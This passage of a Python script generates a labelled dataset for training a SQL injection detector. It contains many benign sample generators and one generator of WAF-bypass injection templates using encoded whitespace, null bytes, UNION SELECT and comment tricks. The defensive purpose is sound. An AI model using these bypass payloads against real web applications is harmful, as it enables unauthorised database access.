def gen_waf_bypass_advanced(n: int) -> List[str]:
    """Generate advanced WAF bypass payloads.

    Techniques: whitespace alternatives, encoding tricks, keyword splitting,
    MySQL conditional comments, fullwidth Unicode.
    """
    samples = set()

    while len(samples) < n:
        c = rand_comment()
        prefix = rand_prefix()
        table = rand_table()
        col = rand_column()
        num_cols = random.randint(1, 5)
        nulls = ','.join(['NULL'] * num_cols)

        templates = [
            # Tab/newline/CR as whitespace
            f"'{chr(9)}OR{chr(9)}1=1{c}",
            f"'{chr(10)}OR{chr(10)}1=1{c}",
            f"'{chr(13)}OR{chr(13)}1=1{c}",
            f"'{chr(12)}OR{chr(12)}1=1{c}",
            f"'+OR+1=1{c}",
            # URL-encoded whitespace
            f"'%09OR%091=1{c}",
            f"'%0aOR%0a1=1{c}",
            f"'%0dOR%0d1=1{c}",
            # NULL byte insertion
            f"'{chr(0)}OR 1=1{c}",
            f"admin'{chr(0)}{c}",
            # Parenthesized operators
            f"{prefix}'||(1=1){c}",
            f"{prefix}'&&(1=1){c}",
            # Backtick delimiters (MySQL)
            f"{prefix}' UNION SELECT `{col}` FROM `{table}`{c}",
            # Square bracket delimiters (MSSQL)
            f"{prefix}' UNION SELECT [{col}] FROM [{table}]{c}",
            # Double-quote identifiers
            f'{prefix}\' UNION SELECT "{col}" FROM "{table}"{c}',
            # Multiline payload
            f"'\nOR\n1=1\n{c}",
            f"'\r\nOR\r\n1=1\r\n{c}",
            # Excess parentheses
            f"{prefix}' OR (((((1=1)))))){c}",
            f"{prefix}' OR (1)=(1){c}",
            # Comment nesting attempts
            f"{prefix}' OR 1=1--/*",
            f"{prefix}' OR 1=1#/**/",
            # Mixed comment + encoding
            f"{prefix}'/*%20*/OR/*%20*/1=1{c}",
        ]

        s = random.choice(templates)
        if random.random() < 0.15:
            s = rand_case(s)
        samples.add(s)

    return list(samples)[:n]


# ═══════════════════════════════════════════════════════════════════
# SAFE INPUT GENERATORS
# ═══════════════════════════════════════════════════════════════════

FIRST_NAMES = [
    "James", "Mary", "John", "Patricia", "Robert", "Jennifer", "Michael",
    "Linda", "William", "Elizabeth", "David", "Barbara", "Richard", "Susan",
    "Joseph", "Jessica", "Thomas", "Sarah", "Charles", "Karen", "Christopher",
    "Lisa", "Daniel", "Nancy", "Matthew", "Betty", "Anthony", "Margaret",
    "Mark", "Sandra", "Donald", "Ashley", "Steven", "Dorothy", "Paul", "Kimberly",
    "Andrew", "Emily", "Joshua", "Donna", "Kenneth", "Michelle", "Kevin", "Carol",
    "Brian", "Amanda", "George", "Melissa", "Timothy", "Deborah",
]

LAST_NAMES = [
    "Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller",
    "Davis", "Rodriguez", "Martinez", "Hernandez", "Lopez", "Gonzalez",
    "Wilson", "Anderson", "Thomas", "Taylor", "Moore", "Jackson", "Martin",
    "Lee", "Perez", "Thompson", "White", "Harris", "Sanchez", "Clark",
    "Ramirez", "Lewis", "Robinson", "Walker", "Young", "Allen", "King",
    "Wright", "Scott", "Torres", "Nguyen", "Hill", "Flores",
]

APOSTROPHE_NAMES = [
    "O'Brien", "O'Connor", "O'Neil", "O'Reilly", "O'Sullivan", "O'Malley",
    "O'Donnell", "O'Leary", "O'Hara", "D'Angelo", "D'Arcy", "D'Cruz",
    "McDonald's", "L'Oreal", "it's", "don't", "won't", "can't", "shouldn't",
    "they're", "we're", "you're", "he's", "she's", "children's", "women's",
    "rock 'n' roll", "ma'am", "o'clock", "ne'er-do-well",
]

DOMAINS = [
    "gmail.com", "yahoo.com", "hotmail.com", "outlook.com", "example.com",
    "company.org", "university.edu", "business.net", "mail.ru", "protonmail.com",
]

SENTENCES_WITH_SQL_WORDS = [
    "Please select an option from the dropdown",
    "Select all that apply to your situation",
    "Drop me a line when you get a chance",
    "Please drop off the package at reception",
    "Update your profile information",
    "We will update you on the status",
    "Delete old files from the folder",
    "Please delete my account",
    "Join our union for better benefits",
    "The European Union announced new regulations",
    "Insert coin to play the game",
    "Insert your card into the reader",
    "The table is ready for dinner",
    "Check the table of contents",
    "Where is the nearest hospital",
    "Where do you want to go",
    "Let me order some food",
    "Order by name or by date",
    "Select the best option available",
    "We need to drop this topic",
    "The group will meet on Tuesday",
    "Having a great time on vacation",
    "Set your preferences in settings",
    "Create a new document",
    "Alter the recipe as needed",
    "Grant me permission to enter",
    "Execute the plan as discussed",
    "The values are within normal range",
    "I like the combination of colors",
    "We need to select candidates for the role",
    "The union representative will attend",
    "Please insert your feedback below",
    "You can delete cookies from your browser",
    "Drop by anytime you're free",
    "The database of knowledge is vast",
    "Null and void agreement",
    "There is no null hypothesis here",
    "Or maybe we should try something different",
    "And then we went to the store",
    "Not all heroes wear capes",
    "Is this the right approach",
    "Between you and me",
    "Like a rolling stone",
    "From what I understand",
    "Having said that let us proceed",
    "In my humble opinion",
]

# NEW: Multi-keyword sentences that could trigger false positives
MULTI_KEYWORD_SENTENCES = [
    "Please select items from the drop-down list and update or delete entries",
    "You can create a new table or alter an existing one in the settings",
    "Grant the user permission to execute the command and update the status",
    "Select all files from the folder where the name is null or empty",
    "The union between France and Germany was strong or weak depending on context",
    "Insert the values from the table into the form and select submit",
    "We need to drop the old approach and create a new one from scratch",
    "Having selected the items from the list we need to order them by date",
    "Delete the entries where the status is null and update the remaining ones",
    "The group decided to alter the plan and execute it from a different location",
    "Please select from the menu and order between 1 and 5 items",
    "Update or delete the records from the database table as needed",
    "We need to insert new values and create a backup before we drop the old table",
    "Select candidates from the pool where experience is not null and grant interviews",
    "The user wants to update their profile and delete old entries from the log",
    "Between sessions we need to truncate the temporary tables or drop them entirely",
    "Execute the batch job to select records from the archive and insert into production",
    "Having reviewed all entries we should delete duplicates and update the master table",
    "From what I understand the union decided to alter working conditions for all members",
    "Is it possible to select a few items from the list or should we take all of them",
]

# NEW: SQL documentation and code snippets that must be safe
SQL_DOCUMENTATION_SNIPPETS = [
    "The SELECT statement retrieves data from one or more tables",
    "Use WHERE clause to filter results based on conditions",
    "JOIN combines rows from two or more tables based on a related column",
    "GROUP BY groups rows that have the same values in summary rows",
    "The HAVING clause filters groups based on aggregate conditions",
    "ORDER BY sorts the result set by one or more columns",
    "INSERT INTO adds new rows to a table",
    "UPDATE modifies existing records in a table",
    "DELETE removes rows from a table",
    "CREATE TABLE defines a new table in the database",
    "ALTER TABLE modifies the structure of an existing table",
    "DROP TABLE removes a table from the database",
    "UNION combines the result set of two SELECT statements",
    "TRUNCATE removes all rows from a table without logging",
    "GRANT gives privileges to database users",
    "REVOKE removes privileges from database users",
    "SELECT * FROM users WHERE id = 1",
    "INSERT INTO users (name, email) VALUES ('John', 'john@example.com')",
    "UPDATE users SET status = 'active' WHERE id = 5",
    "DELETE FROM logs WHERE created_at < '2024-01-01'",
    "SELECT COUNT(*) FROM orders GROUP BY customer_id HAVING COUNT(*) > 5",
    "SELECT u.name, o.total FROM users u JOIN orders o ON u.id = o.user_id",
    "CREATE INDEX idx_email ON users(email)",
    "The OR operator combines conditions in WHERE clause",
    "AND operator requires both conditions to be true",
    "NULL represents a missing or unknown value in SQL",
    "Use IS NULL to check for NULL values, not = NULL",
    "BETWEEN filters values within a given range",
    "IN operator checks if a value matches any value in a list",
    "LIKE operator is used for pattern matching with wildcards",
    "EXISTS returns TRUE if the subquery returns any rows",
    "CONCAT function joins two or more strings together",
    "SUBSTRING extracts a portion of a string",
    "The SLEEP function pauses execution for specified seconds",
    "BENCHMARK function executes an expression multiple times",
]

PATH_TEMPLATES = [
    "/api/v1/users/{id}",
    "/api/v2/products/{id}",
    "/dashboard/settings",
    "/auth/login",
    "/auth/register",
    "/api/search?q={query}",
    "https://example.com/page/{id}",
    "https://cdn.example.com/images/{name}.jpg",
    "/uploads/{name}.pdf",
    "/files/{uuid}",
    "C:\\Users\\{name}\\Documents",
    "/home/{name}/projects",
]


def gen_safe_names(n: int) -> List[str]:
    """Generate realistic person names."""
    samples = []
    for _ in range(n):
        kind = random.choice(['full', 'first', 'last', 'apostrophe', 'username'])
        if kind == 'full':
            s = f"{random.choice(FIRST_NAMES)} {random.choice(LAST_NAMES)}"
        elif kind == 'first':
            s = random.choice(FIRST_NAMES)
        elif kind == 'last':
            s = random.choice(LAST_NAMES)
        elif kind == 'apostrophe':
            s = random.choice(APOSTROPHE_NAMES)
        else:
            fn = random.choice(FIRST_NAMES).lower()
            ln = random.choice(LAST_NAMES).lower()
            s = random.choice([
                f"{fn}_{ln}", f"{fn}.{ln}", f"{fn}{rand_int(1, 99)}",
                f"{fn[0]}{ln}", f"{fn}{ln[:3]}",
            ])
        samples.append(s)
    return samples


def gen_safe_emails(n: int) -> List[str]:
    """Generate realistic email addresses."""
    samples = []
    for _ in range(n):
        fn = random.choice(FIRST_NAMES).lower()
        ln = random.choice(LAST_NAMES).lower()
        domain = random.choice(DOMAINS)
        fmt = random.choice([
            f"{fn}.{ln}@{domain}",
            f"{fn}{ln}@{domain}",
            f"{fn}_{ln}@{domain}",
            f"{fn[0]}{ln}@{domain}",
            f"{fn}{rand_int(1, 999)}@{domain}",
        ])
        samples.append(fmt)
    return samples


def gen_safe_ids(n: int) -> List[str]:
    """Generate numeric IDs, UUIDs, dates, IPs, phone numbers."""
    samples = []
    for _ in range(n):
        kind = random.choice(['int', 'uuid', 'date', 'ip', 'phone', 'hex'])
        if kind == 'int':
            s = str(rand_int(1, 999999))
        elif kind == 'uuid':
            s = str(uuid.uuid4())
        elif kind == 'date':
            y = random.randint(2020, 2026)
            m = random.randint(1, 12)
            d = random.randint(1, 28)
            s = f"{y}-{m:02d}-{d:02d}"
        elif kind == 'ip':
            s = f"{rand_int(1,255)}.{rand_int(0,255)}.{rand_int(0,255)}.{rand_int(1,255)}"
        elif kind == 'phone':
            s = f"+1-{rand_int(200,999)}-{rand_int(100,999)}-{rand_int(1000,9999)}"
        else:
            s = uuid.uuid4().hex[:random.randint(8, 32)]
        samples.append(s)
    return samples


def gen_safe_sentences(n: int) -> List[str]:
    """Generate natural language sentences containing SQL keywords."""
    samples = set()
    adverbs = ['please', 'kindly', 'quickly', 'carefully', 'always', 'never', 'just', 'simply']
    subjects = ['I', 'We', 'You', 'They', 'The team', 'Our system', 'The manager', 'Customers']
    while len(samples) < n:
        s = random.choice(SENTENCES_WITH_SQL_WORDS)
        if random.random() < 0.3:
            s = s.lower()
        if random.random() < 0.2:
            s = s.upper()
        if random.random() < 0.3:
            s = s + random.choice(['.', '!', '?', '...', ''])
        if random.random() < 0.4:
            s = random.choice(subjects) + ' ' + s[0].lower() + s[1:]
        if random.random() < 0.3:
            s = random.choice(adverbs) + ' ' + s
        if random.random() < 0.3:
            s = s + ' ' + rand_str(random.randint(2, 6))
        samples.add(s)
    return list(samples)[:n]


def gen_safe_multi_keyword_prose(n: int) -> List[str]:
    """Generate longer prose with multiple SQL keywords — must NOT trigger.

    These are the hardest false-positive cases: natural language with
    3+ SQL keywords like 'select', 'from', 'where', 'drop', 'update'.
    """
    samples = set()
    connectors = [' Also, ', ' Furthermore, ', ' Moreover, ', ' In addition, ', ' Then, ', ' Next, ', ' Finally, ']
    while len(samples) < n:
        s = random.choice(MULTI_KEYWORD_SENTENCES)
        if random.random() < 0.3:
            s = s.lower()
        if random.random() < 0.1:
            s = s.upper()
        if random.random() < 0.3:
            s = s + random.choice(['.', '!', '?', ''])
        if random.random() < 0.4:
            s2 = random.choice(MULTI_KEYWORD_SENTENCES)
            s = s + random.choice(connectors) + s2[0].lower() + s2[1:]
        if random.random() < 0.3:
            s = s + ' ' + rand_str(random.randint(2, 6))
        samples.add(s)
    return list(samples)[:n]


def gen_safe_sql_documentation(n: int) -> List[str]:
    """Generate SQL documentation and code snippet text.

    Teaching/explaining SQL is NOT an attack and must be safe.
    """
    samples = set()
    prefixes = ['Note: ', 'Example: ', 'Tip: ', 'SQL: ', 'Syntax: ', 'Info: ', 'Docs: ', 'Reference: ']
    suffixes = [' (standard SQL)', ' -- common usage', ' for beginners', ' in MySQL', ' in PostgreSQL', ' in SQL Server']
    while len(samples) < n:
        s = random.choice(SQL_DOCUMENTATION_SNIPPETS)
        if random.random() < 0.2:
            s = s.lower()
        if random.random() < 0.3:
            s = s + random.choice(['.', '', ''])
        if random.random() < 0.35:
            s = random.choice(prefixes) + s
        if random.random() < 0.3:
            s = s + random.choice(suffixes)
        if random.random() < 0.3:
            s = s + ' ' + rand_str(random.randint(2, 5))
        samples.add(s)
    return list(samples)[:n]


def gen_safe_json(n: int) -> List[str]:
    """Generate JSON-like strings and API tokens."""
    samples = []
    for _ in range(n):
        kind = random.choice(['json', 'token', 'base64', 'key_value'])
        if kind == 'json':
            key = random.choice(['name', 'email', 'status', 'count', 'type', 'message'])
            val = random.choice(['active', 'pending', 'hello', '42', 'true', 'null'])
            s = f'{{""{key}"": ""{val}""}}'
        elif kind == 'token':
            prefix = random.choice(['sk-', 'pk-', 'Bearer ', 'token_', 'api_'])
            s = prefix + ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(20, 40)))
        elif kind == 'base64':
            s = ''.join(random.choices(string.ascii_letters + string.digits + '+/', k=random.randint(16, 64))) + '=='
        else:
            k = random.choice(['user_id', 'session', 'ref', 'lang', 'theme'])
            v = random.choice(['en', 'dark', 'default', str(rand_int(1, 1000))])
            s = f"{k}={v}"
        samples.append(s)
    return samples


def gen_safe_paths(n: int) -> List[str]:
    """Generate URL paths and file paths."""
    samples = []
    for _ in range(n):
        t = random.choice(PATH_TEMPLATES)
        s = t.format(
            id=rand_int(1, 99999),
            query=rand_str(random.randint(3, 12)),
            name=rand_str(random.randint(4, 10)),
            uuid=str(uuid.uuid4()),
        )
        samples.append(s)
    return samples


def gen_safe_quotes(n: int) -> List[str]:
    """Generate strings with quotes that are NOT SQL injection."""
    _quote_templates = [
        "it's a beautiful day",
        "I'm going home",
        "they're coming tomorrow",
        "she said \"hello\"",
        "the file 'readme.txt' is missing",
        "use the 'help' command",
        "type 'yes' to confirm",
        "title: 'My First Post'",
        "name: \"John Doe\"",
        "error: 'file not found'",
        "value='checked'",
        "class='active'",
        "data-id='123'",
        "alt='logo image'",
        "placeholder='Enter your name'",
        "the dog's bone",
        "mother's day",
        "father's car",
        "today's special",
        "world's best",
        "boss's office",
        "1 + 1 = 2",
        "x = y + z",
        "a != b",
        "count >= 10",
        "price <= 50.00",
        "if (x > 0) { return true; }",
        "print('hello world')",
        "console.log('test')",
        "SELECT is a reserved word in SQL",
        "The user's 'select' option was invalid",
        "O'Reilly's book on SQL databases",
        "admin@example.com's profile was updated",
        "The company's union representatives met",
        "It's true or false question",
        "McDonald's drive-through order system",
        "The dog's 'drop' command worked well",
        "She said 'delete the old files please'",
    ]
    samples = set()
    while len(samples) < n:
        s = random.choice(_quote_templates)
        if random.random() < 0.3:
            s = rand_str(random.randint(2, 5)) + ' ' + s
        if random.random() < 0.3:
            s = s + ' ' + rand_str(random.randint(2, 5))
        if random.random() < 0.2:
            s = random.choice(FIRST_NAMES) + "'s " + s
        if random.random() < 0.2:
            s = s + ' ' + random.choice(['.', '!', '?', ''])
        samples.add(s)
    return list(samples)[:n]


def gen_safe_adversarial(n: int) -> List[str]:
    """Generate adversarial safe inputs designed to almost look like SQL injection.

    These contain SQL keywords, special chars, or patterns that superficially
    resemble injection but are actually benign.
    """
    _adversarial_templates = [
        "The password1=1 is strong",
        "Room 101 OR similar",
        "SELECT few items from the list",
        "Drop by anytime",
        "Union Station is nearby",
        "The user's comment was deleted",
        "admin@example.com's profile",
        "O'Reilly's book on SQL",
        "Database tables are empty",
        "Benchmark test results",
        "The sleep timer is set",
        "NULL values are ignored",
        "True or false question",
        "if (x > 0 && y < 10)",
        "a || b",
        "x = 1; y = 2;",
        "count >= 10 && count <= 100",
        "return true || false",
        "assert(x != null && y != null)",
        "for i in range(1, 100):",
        "var sql = 'SELECT * FROM users';",
        "query = f\"SELECT * FROM {table}\"",
        "cursor.execute('SELECT id FROM users WHERE name = %s', (name,))",
        "Error code 1=1 means success",
        "Set value 1 = 1 in config",
        "Score: 1 or 2 points",
        "Choose 1 and 2 from the options",
        "Between 1 and 10 participants attended",
        "The ratio is 1:1 or 2:1",
        "$99.99 -- discounted price",
        "Version 2.0 -- released today",
        "Step 1 -- prepare materials",
        "TODO: # fix this later",
        "CSS: /* hide overflow */",
        "/* This is a code comment */",
        "price = $19.99; tax = $1.50",
        "path = '/home/user'; cd $path",
        "'hello world'",
        "title = 'My Report'",
        "She said 'yes' to the proposal",
        "The word 'union' means together",
        "Type 'drop' to remove item",
        "The union of European countries has decided to select new representatives from member states and drop old policies where they are no longer relevant",
        "We need to update the configuration, delete temporary files, and create a new backup from the production database table before the scheduled maintenance",
        "Please select your preferred option from the list below and insert your comments in the text field where appropriate",
    ]
    samples = set()
    cities = ['New York', 'London', 'Berlin', 'Tokyo', 'Paris', 'Moscow', 'Sydney', 'Toronto']
    products = ['laptop', 'phone', 'tablet', 'monitor', 'keyboard', 'mouse', 'headset', 'camera']
    while len(samples) < n:
        s = random.choice(_adversarial_templates)
        if random.random() < 0.2:
            s = s.lower()
        if random.random() < 0.1:
            s = s.upper()
        if random.random() < 0.35:
            s = s + ' ' + rand_str(random.randint(2, 6))
        if random.random() < 0.25:
            s = random.choice(cities) + ': ' + s
        if random.random() < 0.2:
            s = s + ' for ' + random.choice(products)
        samples.add(s)
    return list(samples)[:n]


def gen_safe_edge_cases(n: int) -> List[str]:
    """Generate edge case inputs: short strings, unicode, HTML, etc."""
    samples = set()
    unicode_names = ['Muller', 'Bjork', 'Renee', 'Zoe', 'Noel', 'Jose', 'Cafe',
                     'Hernandez', 'Francois', 'Gunther', 'Ingrid', 'Olaf', 'Yuki']
    tags = ['div', 'span', 'p', 'h1', 'h2', 'a', 'img', 'br', 'li', 'td', 'button', 'input']
    words = ['Hello', 'World', 'Test', 'Welcome', 'Content', 'Data', 'Result', 'Item']

    while len(samples) < n:
        kind = random.choice([
            'single_char', 'short', 'numeric', 'unicode', 'html',
            'empty_like', 'special_chars', 'long_word',
        ])

        if kind == 'single_char':
            s = random.choice(list(string.printable.strip()))
        elif kind == 'short':
            s = rand_str(random.randint(1, 6))
        elif kind == 'numeric':
            s = str(round(random.uniform(-10000, 10000), random.randint(0, 6)))
        elif kind == 'unicode':
            s = random.choice(unicode_names) + ' ' + rand_str(random.randint(2, 5))
        elif kind == 'html':
            tag = random.choice(tags)
            word = random.choice(words)
            s = f"<{tag}>{word} {rand_str(random.randint(2, 6))}</{tag}>"
        elif kind == 'empty_like':
            s = random.choice(['', ' ', '  ', '\t', '\n', 'N/A', 'null', 'none', 'undefined', '-',
                               'n/a', 'NULL', 'None', 'NONE', '0', 'false', 'False', 'FALSE'])
        elif kind == 'special_chars':
            s = ''.join(random.choices('!@#$%^&*()_+-=[]{}|;:,.<>?/', k=random.randint(3, 12)))
        else:
            s = rand_str(random.randint(15, 50))

        samples.add(s)
    return list(samples)[:n]


# ═══════════════════════════════════════════════════════════════════
# MAIN GENERATION
# ═══════════════════════════════════════════════════════════════════

def generate_dataset() -> Tuple[List[str], List[int]]:
    """Generate the full dataset with balanced classes."""

    texts = []
    labels = []

    # === SQL INJECTION SAMPLES (30,000) ===
    print("Generating SQL injection samples...")

    sqli_generators = [
        (gen_boolean_based, 4000, "Boolean-based"),
        (gen_union_based, 3000, "UNION-based"),
        (gen_time_based, 2500, "Time-based"),
        (gen_stacked_queries, 3000, "Stacked queries"),
        (gen_error_based, 1500, "Error-based"),
        (gen_encoded_obfuscated, 3000, "Encoded/obfuscated"),
        (gen_os_command, 1500, "OS command"),
        (gen_comment_truncation, 1500, "Comment truncation"),
        # NEW categories
        (gen_comment_split_keywords, 2500, "Comment-split keywords"),
        (gen_no_quote_numeric, 2000, "No-quote numeric"),
        (gen_like_regexp_bypass, 1500, "LIKE/REGEXP bypass"),
        (gen_hex_char_encoding, 1500, "Hex/CHAR encoding"),
        (gen_nested_subquery, 1500, "Nested subqueries"),
        (gen_http_param_pollution, 1000, "HTTP param pollution"),
        (gen_waf_bypass_advanced, 1500, "Advanced WAF bypass"),
    ]

    for gen_fn, count, name in sqli_generators:
        samples = gen_fn(count)
        texts.extend(samples)
        labels.extend([1] * len(samples))
        print(f"  {name}: {len(samples)} samples")

    total_injection = sum(1 for l in labels if l == 1)

    # === SAFE SAMPLES (match injection count for balance) ===
    print("Generating safe samples...")

    # Calculate safe target to match injection count
    safe_target = total_injection
    # Distribute across safe generators
    safe_generators = [
        (gen_safe_names, int(safe_target * 0.10), "Names"),
        (gen_safe_emails, int(safe_target * 0.07), "Emails"),
        (gen_safe_ids, int(safe_target * 0.07), "IDs/UUIDs/Dates"),
        (gen_safe_sentences, int(safe_target * 0.10), "Sentences with SQL words"),
        (gen_safe_multi_keyword_prose, int(safe_target * 0.10), "Multi-keyword prose"),
        (gen_safe_sql_documentation, int(safe_target * 0.10), "SQL documentation"),
        (gen_safe_json, int(safe_target * 0.07), "JSON/API tokens"),
        (gen_safe_paths, int(safe_target * 0.07), "URLs/Paths"),
        (gen_safe_quotes, int(safe_target * 0.10), "Strings with quotes"),
        (gen_safe_adversarial, int(safe_target * 0.12), "Adversarial safe inputs"),
        (gen_safe_edge_cases, int(safe_target * 0.10), "Edge cases"),
    ]

    for gen_fn, count, name in safe_generators:
        samples = gen_fn(count)
        texts.extend(samples)
        labels.extend([0] * len(samples))
        print(f"  {name}: {len(samples)} samples")

    return texts, labels


def main():
    print("=" * 60)
    print("SQL Injection Dataset Generator v2.0")
    print("=" * 60)

    texts, labels = generate_dataset()

    # Deduplicate
    seen = set()
    unique_texts = []
    unique_labels = []
    for t, l in zip(texts, labels):
        if t not in seen:
            seen.add(t)
            unique_texts.append(t)
            unique_labels.append(l)

    print(f"\nTotal before dedup: {len(texts)}")
    print(f"Total after dedup:  {len(unique_texts)}")
    print(f"Duplicates removed: {len(texts) - len(unique_texts)}")

    # Count labels before balancing
    n_sqli = sum(1 for l in unique_labels if l == 1)
    n_safe = sum(1 for l in unique_labels if l == 0)
    print(f"\nBefore balancing:")
    print(f"  Injection: {n_sqli}, Safe: {n_safe}")

    # Balance classes: downsample majority to match minority
    minority_count = min(n_sqli, n_safe)
    sqli_items = [(t, l) for t, l in zip(unique_texts, unique_labels) if l == 1]
    safe_items = [(t, l) for t, l in zip(unique_texts, unique_labels) if l == 0]
    random.shuffle(sqli_items)
    random.shuffle(safe_items)
    sqli_items = sqli_items[:minority_count]
    safe_items = safe_items[:minority_count]
    balanced = sqli_items + safe_items
    random.shuffle(balanced)
    unique_texts, unique_labels = zip(*balanced)

    n_sqli = sum(1 for l in unique_labels if l == 1)
    n_safe = sum(1 for l in unique_labels if l == 0)
    print(f"\nAfter balancing:")
    print(f"  Injection: {n_sqli}, Safe: {n_safe}")
    print(f"  Balance ratio: {n_sqli / (n_sqli + n_safe):.2%} injection")

    # Write CSV
    OUTPUT_DIR.mkdir(parents=True, exist_ok=True)

    with open(OUTPUT_FILE, 'w', newline='', encoding='utf-8') as f:
        writer = csv.writer(f)
        writer.writerow(['text', 'label'])
        for t, l in zip(unique_texts, unique_labels):
            writer.writerow([t, l])

    print(f"\nDataset saved to: {OUTPUT_FILE}")
    print(f"Total samples:    {len(unique_texts)}")
    print("=" * 60)


if __name__ == '__main__':
    main()
